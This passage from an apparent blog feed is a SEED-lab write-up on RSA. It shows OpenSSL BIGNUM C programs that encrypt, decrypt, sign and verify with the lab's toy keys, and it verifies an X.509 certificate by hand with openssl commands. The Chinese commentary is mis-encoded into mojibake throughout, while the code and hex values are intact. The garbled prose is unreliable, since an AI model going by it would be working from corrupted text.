* q =  %s\n , d = %s \n&quot;</span>, number_str,number_str1);<br>    <br>    <span class="hljs-comment">//free </span><br>    OPENSSL_free(number_str);<br>    OPENSSL_free(number_str1);<br>    <br>    BN_clear_free(p);<br>    BN_clear_free(q);<br>    BN_clear_free(e);<br>    BN_clear_free(d);<br>    BN_clear_free(n);<br>    BN_clear_free(p_1);<br>    BN_clear_free(q_1);<br>    BN_clear_free(phi_n);<br>    BN_clear_free(res);<br>    BN_clear_free(one);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="Task-2-Encrypting-a-Message"><a href="#Task-2-Encrypting-a-Message" class="headerlink" title="Task 2: Encrypting a Message"></a>Task 2: Encrypting a Message</h1><ul><li>(e, n)æ˜¯å…¬é’¥</li><li>åŠ å¯†æ¶ˆæ¯â€A top secret!â€</li><li>ASCIIè½¬åŒ–ä¸ºhexå­—ç¬¦ä¸²ï¼Œå†é€šè¿‡BN_hex2bn() APIå°†å­—ç¬¦ä¸²å†è½¬åŒ–ä¸ºBIGNUM</li></ul><p>python å‘½ä»¤å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢å›çº¯ ASCII å­—ç¬¦ä¸²:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -c â€™<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;4120746f702073656372657421&quot;</span>.decode(<span class="hljs-string">&quot;hex&quot;</span>))â€™</span><br><br>A top secret!<br></code></pre></td></tr></table></figure><p>python å‘½ä»¤å°†çº¯ ASCII å­—ç¬¦ä¸²è½¬æ¢å›åå…­è¿›åˆ¶å­—ç¬¦ä¸²:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -c â€™<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;A top secret!&quot;</span>.encode(<span class="hljs-string">&quot;hex&quot;</span>))â€™</span><br><br>4120746f702073656372657421<br></code></pre></td></tr></table></figure><p>ç»™å‡ºçš„å‚æ•°ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">n</span> = DCBFFE<span class="hljs-number">3</span>E<span class="hljs-number">51</span>F<span class="hljs-number">62</span>E<span class="hljs-number">09</span>CE<span class="hljs-number">7032</span>E<span class="hljs-number">2677</span>A<span class="hljs-number">78946</span>A<span class="hljs-number">849</span>DC<span class="hljs-number">4</span>CDDE<span class="hljs-number">3</span>A<span class="hljs-number">4</span>D<span class="hljs-number">0</span>CB<span class="hljs-number">81629242</span>FB<span class="hljs-number">1</span>A<span class="hljs-number">5</span><br><span class="hljs-attribute">e</span> = <span class="hljs-number">010001</span> (this hex value equals to decimal <span class="hljs-number">65537</span>)<br><span class="hljs-attribute">M</span> = A top secret!<br><span class="hljs-attribute">d</span> = <span class="hljs-number">74</span>D<span class="hljs-number">806</span>F<span class="hljs-number">9</span>F<span class="hljs-number">3</span>A<span class="hljs-number">62</span>BAE<span class="hljs-number">331</span>FFE<span class="hljs-number">3</span>F<span class="hljs-number">0</span>A<span class="hljs-number">68</span>AFE<span class="hljs-number">35</span>B<span class="hljs-number">3</span>D<span class="hljs-number">2</span>E<span class="hljs-number">4794148</span>AACBC<span class="hljs-number">26</span>AA<span class="hljs-number">381</span>CD<span class="hljs-number">7</span>D<span class="hljs-number">30</span>D<br></code></pre></td></tr></table></figure><p><strong>æ€è·¯</strong></p><ul><li><p>  ASCII å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ï¼Œå†è½¬æ¢ä¸º<code>BIGNUM</code>ç±»å‹</p></li><li><p>  ä½¿ç”¨då¯ä»¥éªŒè¯ç»“æœæ­£ç¡®</p></li></ul><p><strong>ä»£ç </strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/bn.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NBITS 256</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BN_CTX *ctx = BN_CTX_new();<br>    BIGNUM *e = BN_new();<br>    BIGNUM *d = BN_new();<br>    BIGNUM *n = BN_new();<br>    BIGNUM *M = BN_new();<br>    BIGNUM *C = BN_new();<br>    BIGNUM *res = BN_new();<br>    <br>    <span class="hljs-comment">//å¯¹pã€qã€e Mè¿›è¡Œèµ‹å€¼</span><br>    BN_hex2bn(&amp;n, <span class="hljs-string">&quot;DCBFFE3E51F62E09CE7032E2677A78946A849DC4CDDE3A4D0CB81629242FB1A5&quot;</span>);<br>    BN_hex2bn(&amp;e, <span class="hljs-string">&quot;010001&quot;</span>);<br>    BN_hex2bn(&amp;d, <span class="hljs-string">&quot;74D806F9F3A62BAE331FFE3F0A68AFE35B3D2E4794148AACBC26AA381CD7D30D&quot;</span>);<br>    BN_hex2bn(&amp;M, <span class="hljs-string">&quot;4120746f702073656372657421&quot;</span>);<br><br>    <span class="hljs-comment">//C = M^e mod n</span><br>    BN_mod_exp(C, M, e, n, ctx);<br>    BN_mod_exp(res, C, d, n, ctx);<br>    <br>    <span class="hljs-comment">//print function</span><br>    <span class="hljs-keyword">char</span> * number_str = BN_bn2hex(C);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;C = %s \n&quot;</span>, number_str);<br>    <br>    <span class="hljs-keyword">char</span> * number_str1 = BN_bn2hex(res);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;C^d = %s \n&quot;</span>, number_str1);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;      4120746f702073656372657421 == \&quot;A top secret \&quot;\n&quot;</span>);<br><br>    <span class="hljs-comment">//free </span><br>    OPENSSL_free(number_str);<br>    OPENSSL_free(number_str1);<br>    <br>    BN_clear_free(e);<br>    BN_clear_free(d);<br>    BN_clear_free(n);<br>    BN_clear_free(M);<br>    BN_clear_free(C);<br>    BN_clear_free(res);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Task-3-Decrypting-a-Message"><a href="#Task-3-Decrypting-a-Message" class="headerlink" title="Task 3: Decrypting a Message"></a>Task 3: Decrypting a Message</h1><p>ä½¿ç”¨çš„å…¬é’¥/ç§é’¥ä¸ Task 2ä¸­ä½¿ç”¨çš„å…¬é’¥/ç§é’¥ç›¸åŒ,è§£å¯†ä»¥ä¸‹å¯†æ–‡ Cï¼Œå¹¶å°†å…¶è½¬æ¢å›çº¯ ASCII å­—ç¬¦ä¸²</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span> = <span class="hljs-number">8</span>C<span class="hljs-number">0</span>F<span class="hljs-number">971</span>DF<span class="hljs-number">2</span>F<span class="hljs-number">3672</span>B<span class="hljs-number">28811407</span>E<span class="hljs-number">2</span>DABBE<span class="hljs-number">1</span>DA<span class="hljs-number">0</span>FEBBBDFC<span class="hljs-number">7</span>DCB<span class="hljs-number">67396567</span>EA<span class="hljs-number">1</span>E<span class="hljs-number">2493</span>F<br></code></pre></td></tr></table></figure><p><strong>æ€è·¯</strong></p><ul><li>  RSAè¿ç®—ä¹‹åä½¿ç”¨pythonè§£ç å¾—å‡ºä¿¡æ¯</li></ul><p><strong>ä»£ç </strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/bn.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NBITS 256</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BN_CTX *ctx = BN_CTX_new();<br>    BIGNUM *e = BN_new();<br>    BIGNUM *d = BN_new();<br>    BIGNUM *n = BN_new();<br>    BIGNUM *M = BN_new();<br>    BIGNUM *C = BN_new();<br>    BIGNUM *res = BN_new();<br>    <br>    <span class="hljs-comment">//å¯¹pã€qã€e Mè¿›è¡Œèµ‹å€¼</span><br>    BN_hex2bn(&amp;n, <span class="hljs-string">&quot;DCBFFE3E51F62E09CE7032E2677A78946A849DC4CDDE3A4D0CB81629242FB1A5&quot;</span>);<br>    BN_hex2bn(&amp;e, <span class="hljs-string">&quot;010001&quot;</span>);<br>    BN_hex2bn(&amp;d, <span class="hljs-string">&quot;74D806F9F3A62BAE331FFE3F0A68AFE35B3D2E4794148AACBC26AA381CD7D30D&quot;</span>);<br>    BN_hex2bn(&amp;M, <span class="hljs-string">&quot;4120746f702073656372657421&quot;</span>);<br>    BN_hex2bn(&amp;C, <span class="hljs-string">&quot;8C0F971DF2F3672B28811407E2DABBE1DA0FEBBBDFC7DCB67396567EA1E2493F&quot;</span>);<br>    <br>    <span class="hljs-comment">//M = C^d mod n</span><br>    BN_mod_exp(res, C, d, n, ctx);<br>    <br>    <span class="hljs-comment">//print function</span><br>    <span class="hljs-keyword">char</span> * number_str = BN_bn2hex(res);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;M = %s \n&quot;</span>, number_str);<br>    <br>    <span class="hljs-comment">//free </span><br>    OPENSSL_free(number_str);<br>    <br>    BN_clear_free(e);<br>    BN_clear_free(d);<br>    BN_clear_free(n);<br>    BN_clear_free(M);<br>    BN_clear_free(C);<br>    BN_clear_free(res);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Task-4-Signing-a-Message"><a href="#Task-4-Signing-a-Message" class="headerlink" title="Task 4: Signing a Message"></a>Task 4: Signing a Message</h1><p>ä½¿ç”¨çš„å…¬é’¥/ç§é’¥ä¸ Task 2ä¸­ä½¿ç”¨çš„å…¬é’¥/ç§é’¥ç›¸åŒ</p><p>å­—ç¬¦ä¸²çš„hexç¼–ç æ˜¯<code>49206f776520796f75202432303030</code></p><ul><li><p>  æŒ‰ç…§ä¸Šè¿°RSAæ³•åˆ™è¿›è¡Œç¼–ç¨‹</p></li><li><p>  M1 = I owe you $2000ï¼Œå¯¹åº”ç»“æœä¸º<code>80A55421D72345AC199836F60D51DC9594E2BDB4AE20C804823FB71660DE7B82 </code></p></li><li><p>  M2 = I owe you $3000ï¼Œå¯¹åº”ç»“æœä¸º<code> 04FC9C53ED7BBE4ED4BE2C24B0BDF7184B96290B4ED4E3959F58E94B1ECEA2EB</code></p></li><li><p>  è™½ç„¶æ˜æ–‡åªæ˜¯æ”¹å˜ä¸€ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯ç­¾åç»“æœè¿¥ç„¶ä¸åŒ</p></li></ul><h1 id="Task-5-Verifying-a-Signature"><a href="#Task-5-Verifying-a-Signature" class="headerlink" title="Task 5: Verifying a Signature"></a>Task 5: Verifying a Signature</h1><p>S æ˜¯ M çš„ç­¾åï¼ŒAlice çš„å…¬é’¥æ˜¯(eï¼Œn)ï¼ŒéªŒè¯ç­¾åæ˜¯å¦ç¡®å®æ˜¯çˆ±ä¸½ä¸çš„</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">M</span> = Launch a missile.<br><span class="hljs-attribute">S</span> = <span class="hljs-number">643</span>D<span class="hljs-number">6</span>F<span class="hljs-number">34902</span>D<span class="hljs-number">9</span>C<span class="hljs-number">7</span>EC<span class="hljs-number">90</span>CB<span class="hljs-number">0</span>B<span class="hljs-number">2</span>BCA<span class="hljs-number">36</span>C<span class="hljs-number">47</span>FA<span class="hljs-number">37165</span>C<span class="hljs-number">0005</span>CAB<span class="hljs-number">026</span>C<span class="hljs-number">0542</span>CBDB<span class="hljs-number">6802</span>F<br><span class="hljs-attribute">e</span> = <span class="hljs-number">010001</span> (this hex value equals to decimal <span class="hljs-number">65537</span>)<br><span class="hljs-attribute">n</span> = AE<span class="hljs-number">1</span>CD<span class="hljs-number">4</span>DC<span class="hljs-number">432798</span>D<span class="hljs-number">933779</span>FBD<span class="hljs-number">46</span>C<span class="hljs-number">6</span>E<span class="hljs-number">1247</span>F<span class="hljs-number">0</span>CF<span class="hljs-number">1233595113</span>AA<span class="hljs-number">51</span>B<span class="hljs-number">450</span>F<span class="hljs-number">18116115</span><br></code></pre></td></tr></table></figure><p>è½¬ç å¾—åˆ°å¯¹åº”hexä¸º<code>4c61756e63682061206d697373696c65</code></p><ul><li><p>  <strong>ç­¾åè¿‡ç¨‹ï¼šç§é’¥ç­¾åï¼Œå…¬é’¥éªŒè¯</strong></p></li><li><p>  ä¸è¿è¡Œæˆªå›¾æ¯”å¯¹ï¼Œ$S^e$çš„ç»“æœä¸æ˜æ–‡ç›¸åŒï¼Œå› æ­¤ç­¾åæœ‰æ•ˆ</p></li></ul><h1 id="Task-6-Manually-Verifying-an-X-509-Certificate"><a href="#Task-6-Manually-Verifying-an-X-509-Certificate" class="headerlink" title="Task 6: Manually Verifying an X.509 Certificate"></a>Task 6: Manually Verifying an X.509 Certificate</h1><p>ä½¿ç”¨ç¨‹åºæ‰‹åŠ¨éªŒè¯ X.509è¯ä¹¦ã€‚X.509åŒ…å«æœ‰å…³å…¬é’¥çš„æ•°æ®å’Œæ•°æ®ä¸Šçš„å‘è¡Œè€…ç­¾åã€‚æˆ‘ä»¬å°†ä» Web æœåŠ¡å™¨ä¸‹è½½ä¸€ä¸ªçœŸæ­£çš„ X.509è¯ä¹¦ï¼Œè·å–å…¶å‘è¡Œè€…çš„å…¬é’¥ï¼Œç„¶åä½¿ç”¨è¿™ä¸ªå…¬é’¥éªŒè¯è¯ä¹¦ä¸Šçš„ç­¾å</p><p>è¯ä¹¦ç”Ÿæˆè¿‡ç¨‹ï¼š</p><ul><li>é¦–å…ˆ CA ä¼šæŠŠæŒæœ‰è€…çš„å…¬é’¥ã€ç”¨é€”ã€é¢å‘è€…ã€æœ‰æ•ˆæ—¶é—´ç­‰ä¿¡æ¯æ‰“æˆä¸€ä¸ªåŒ…ï¼Œç„¶åå¯¹è¿™äº›ä¿¡æ¯è¿›è¡Œ Hash è®¡ç®—ï¼Œå¾—åˆ°ä¸€ä¸ª Hash å€¼ï¼›</li><li>ç„¶å CA ä¼šä½¿ç”¨è‡ªå·±çš„ç§é’¥å°†è¯¥ Hash å€¼åŠ å¯†ï¼Œç”Ÿæˆ Certificate Signatureï¼Œä¹Ÿå°±æ˜¯ CA å¯¹è¯ä¹¦åšäº†ç­¾åï¼›</li><li>æœ€åå°† Certificate Signature æ·»åŠ åœ¨æ–‡ä»¶è¯ä¹¦ä¸Šï¼Œå½¢æˆæ•°å­—è¯ä¹¦ï¼›</li></ul><h2 id="Step-1-Download-a-certificate-from-a-real-web-server"><a href="#Step-1-Download-a-certificate-from-a-real-web-server" class="headerlink" title="Step 1: Download a certificate from a real web server."></a>Step 1: Download a certificate from a real web server.</h2><p>æ˜¾ç¤ºè¯ä¹¦</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> openssl s_client -connect www.example.org:443 -showcerts</span><br></code></pre></td></tr></table></figure><p>æ‰“å°å‡ºæ¥çš„â€Begin CERTIFICATEâ€ å’Œ â€œEND CERTIFICATEâ€ä¹‹é—´çš„å°±æ˜¯è¯ä¹¦ï¼Œå°†å…¶æ‰‹åŠ¨ä¿å­˜åœ¨<code>.pem</code>æ–‡ä»¶ä¸­</p><ul><li><p>å¦‚æœæœ‰ä¸¤ä¸ªè¯ä¹¦ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç½‘ç«™çš„è¯ä¹¦ï¼Œä¿å­˜ä¸ºc0.pemï¼Œç¬¬äºŒä¸ªæ˜¯ä¸­é—´CAçš„è¯ä¹¦ï¼Œä¿å­˜ä¸ºc1.pem</p></li><li><p>å¦‚æœåªæœ‰ä¸€ä¸ªè¯ä¹¦ï¼Œé‚£ä¹ˆè¯´æ˜ç½‘ç«™çš„è¯ä¹¦æ˜¯æ ¹ CA ç­¾åçš„</p></li><li><p>ä½¿ç”¨ -modulus é€‰é¡¹æ˜¾ç¤º n</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">For modulus (n):<br><span class="hljs-meta">$</span><span class="bash"> openssl x509 -<span class="hljs-keyword">in</span> c1.pem -noout -modulus</span><br></code></pre></td></tr></table></figure></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Modulus=C70E6C3F23937FCC70A59D20C30E533F7EC04EC29849CA47D523EF03348574C8A3022E465C0B7DC9889D4F8BF0F89C6C8C5535DBBFF2B3EAFBE356E74A46D91322CA36D59BC1A8E3964393F20CBCE6F9E6E899C86348787F5736691A191D5AD1D47DC29CD47FE18012AE7AEA88EA57D8CA0A0A3A1249A262197A0D24F737EBB473927B05239B12B5CEEB29DFA41402B901A5D4A69C436488DEF87EFEE3F51EE5FEDCA3A8E46631D94C25E918B9895909AEE99D1C6D370F4A1E352028E2AFD4218B01C445AD6E2B63AB926B610A4D20ED73BA7CCEFE16B5DB9F80F0D68B6CD908794A4F7865DA92BCBE35F9B3C4F927804EFF9652E60220E10773E95D2BBDB2F1<br></code></pre></td></tr></table></figure><h2 id="Step-2-Extract-the-public-key-e-n-from-the-issuerâ€™s-certificate-æ±‚å‡ºå…¬é’¥-ï¼ˆe-nï¼‰"><a href="#Step-2-Extract-the-public-key-e-n-from-the-issuerâ€™s-certificate-æ±‚å‡ºå…¬é’¥-ï¼ˆe-nï¼‰" class="headerlink" title="Step 2: Extract the public key (e, n) from the issuerâ€™s certificate. æ±‚å‡ºå…¬é’¥ ï¼ˆe,nï¼‰"></a>Step 2: Extract the public key (e, n) from the issuerâ€™s certificate. æ±‚å‡ºå…¬é’¥ ï¼ˆe,nï¼‰</h2><h2 id="Step-3-Extract-the-signature-from-the-serverâ€™s-certificate-ä»æœåŠ¡å™¨çš„è¯ä¹¦ä¸­æå–ç­¾å"><a href="#Step-3-Extract-the-signature-from-the-serverâ€™s-certificate-ä»æœåŠ¡å™¨çš„è¯ä¹¦ä¸­æå–ç­¾å" class="headerlink" title="Step 3: Extract the signature from the serverâ€™s certificate.ä»æœåŠ¡å™¨çš„è¯ä¹¦ä¸­æå–ç­¾å"></a>Step 3: Extract the signature from the serverâ€™s certificate.ä»æœåŠ¡å™¨çš„è¯ä¹¦ä¸­æå–ç­¾å</h2><ul><li>æ²¡æœ‰ç‰¹åˆ«çš„å‘½ä»¤æ‰“å°å‡º e å’Œ ç­¾åä¿¡æ¯ï¼Œå¯ä»¥æ‰“å°å‡ºè¯ä¹¦æ‰€æœ‰çš„ä¿¡æ¯ç„¶ååœ¨æ–‡æœ¬ä¸­æŸ¥æ‰¾</li><li>ç­¾åä¸­ä¼šæœ‰ç©ºæ ¼å’Œ<code>:</code>ï¼Œå¯ä»¥ä½¿ç”¨è„šæœ¬cat signature | tr -d â€™[:space:]:â€™é™¤å»ï¼Œå¾—åˆ°çº¯åå…­è¿›åˆ¶å­—ç¬¦ä¸²<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-built_in">Print</span> <span class="hljs-keyword">out</span> <span class="hljs-built_in">all</span> the fields, find the <span class="hljs-built_in">exponent</span> (e) and signature:<br>$ openssl x509 -<span class="hljs-keyword">in</span> c1.pem -text -noout<br></code></pre></td></tr></table></figure></li></ul><h2 id="Step-4-æå–æœåŠ¡å™¨è¯ä¹¦çš„æ­£æ–‡"><a href="#Step-4-æå–æœåŠ¡å™¨è¯ä¹¦çš„æ­£æ–‡" class="headerlink" title="Step 4: æå–æœåŠ¡å™¨è¯ä¹¦çš„æ­£æ–‡"></a>Step 4: æå–æœåŠ¡å™¨è¯ä¹¦çš„æ­£æ–‡</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">$ openssl asn1parse -i -in c0.pem -strparse <span class="hljs-number">4</span> -out c0_body.bin -noout<br></code></pre></td></tr></table></figure><p>è®¡ç®—shaå€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">$ sha256sum c0_body.bin<br></code></pre></td></tr></table></figure><h2 id="Step-5-Verify-the-signature"><a href="#Step-5-Verify-the-signature" class="headerlink" title="Step 5:Verify the signature."></a>Step 5:Verify the signature.</h2><p>å¯ä»¥çœ‹å‡ºä¸¤æ®µ<code>sha</code>å€¼ç›¸ç­‰ï¼Œéƒ½æ˜¯<code>837D0252E9D5F45DEC8294152267D7097B387AA178549B65CD6FB2F307013E1C</code>ï¼Œå› æ­¤å¯ä»¥éªŒè¯ï¼Œè¯ä¹¦æœ‰æ•ˆ</p><p><strong>ä»£ç </strong></p><ul><li>  æ±‚å‡º$S^e$</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/bn.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NBITS 256</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BN_CTX *ctx = BN_CTX_new();<br>    BIGNUM *e = BN_new();<br>    BIGNUM *n = BN_new();<br>    BIGNUM *S = BN_new();<br>    BIGNUM *res = BN_new();<br>    <span class="hljs-comment">//èµ‹å€¼</span><br>    BN_hex2bn(&amp;n,      <span class="hljs-string">&quot;C70E6C3F23937FCC70A59D20C30E533F7EC04EC29849CA47D523EF03348574C8A3022E465C0B7DC9889D4F8BF0F89C6C8C5535DBBFF2B3EAFBE356E74A46D91322CA36D59BC1A8E3964393F20CBCE6F9E6E899C86348787F5736691A191D5AD1D47DC29CD47FE18012AE7AEA88EA57D8CA0A0A3A1249A262197A0D24F737EBB473927B05239B12B5CEEB29DFA41402B901A5D4A69C436488DEF87EFEE3F51EE5FEDCA3A8E46631D94C25E918B9895909AEE99D1C6D370F4A1E352028E2AFD4218B01C445AD6E2B63AB926B610A4D20ED73BA7CCEFE16B5DB9F80F0D68B6CD908794A4F7865DA92BCBE35F9B3C4F927804EFF9652E60220E10773E95D2BBDB2F1&quot;</span>);<br>    BN_hex2bn(&amp;S, <span class="hljs-string">&quot;398a004992481658de3e9cce83391bb1ac9a95f956ff7c2d82d3a8365be6cf7dfd4a987248f2b7f652d40b092ca25c3347e29a9b3e97bdd8ba0009c9ae1eb3bcdee81ee1ded905f8a9b03dedb97ab2a93c934e078cf05ecc8bf375336e5582e599429f9c8154fbadce280c3842609568e14d5f832da43276d8511c1d66b79cad1f19f940e47c744ddb2abbeaf3244de9387721523cfd1e811e900084aec866fce3817891d04378992aa485313c9f6bef489e1e394d5107b7534dffe213abe3ca6d7c21f6e2fa2273f465717577da088ef72d5be601c9f7960c5f2da8d73e4c5ec29278e41b4e9b28369f1877f2bbf56a6471780fead5687f1157b4ff0fb0e473&quot;</span>);<br>    BN_hex2bn(&amp;e, <span class="hljs-string">&quot;10001&quot;</span>);<br>    <br>    <br>    BN_mod_exp(res, S, e, n, ctx);<br>     <br>    <span class="hljs-comment">//print function</span><br>    <span class="hljs-keyword">char</span> * number_str = BN_bn2hex(res);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;S^e = %s \n&quot;</span>, number_str);<br>    <br>    <span class="hljs-comment">//free </span><br>    OPENSSL_free(number_str);<br>    <br>    BN_clear_free(e);<br>    BN_clear_free(n);<br>    BN_clear_free(res);<br>    BN_clear_free(S);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-labï¼šSQL Injection Attack Lab</title>
    <link href="/p/961c048e/"/>
    <url>/p/961c048e/</url>
    
